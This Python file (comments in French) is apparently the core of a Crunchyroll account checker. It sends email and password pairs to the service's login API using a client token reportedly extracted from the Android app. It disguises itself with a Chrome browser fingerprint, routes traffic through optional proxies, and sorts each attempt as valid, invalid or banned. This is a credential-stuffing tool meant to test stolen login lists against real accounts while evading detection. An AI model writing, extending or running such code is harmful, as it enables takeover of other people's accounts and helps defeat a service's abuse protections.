from curl_cffi import requests
import uuid

# Token officiel extrait de l'application Android
ANDROID_BASIC_TOKEN = "dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="

class CrunchyChecker:
    def __init__(self, proxy=None):
        # Utilisation de curl_cffi pour simuler parfaitement Chrome 110
        self.session = requests.Session(impersonate="chrome110")
        if proxy:
            # Format: ip:port ou user:pass@ip:port
            self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        self.device_id = str(uuid.uuid4())

    def get_token(self, email, password):
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {
            "Authorization": f"Basic {ANDROID_BASIC_TOKEN}",
            "User-Agent": "Crunchyroll/3.79.0 Android/12 okhttp/4.12.0",
        }
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "device_id": self.device_id,
            "scope": "offline_access",
        }
        try:
            resp = self.session.post(url, data=data, headers=headers, timeout=10)
            if resp.status_code == 200: 
                return "SUCCESS", resp.json().get("access_token")
            if resp.status_code == 401: 
                return "INVALID", None
            if resp.status_code in [403, 1015]: 
                return "BANNED", None
            return "ERROR", None
        except:
            return "TIMEOUT", None
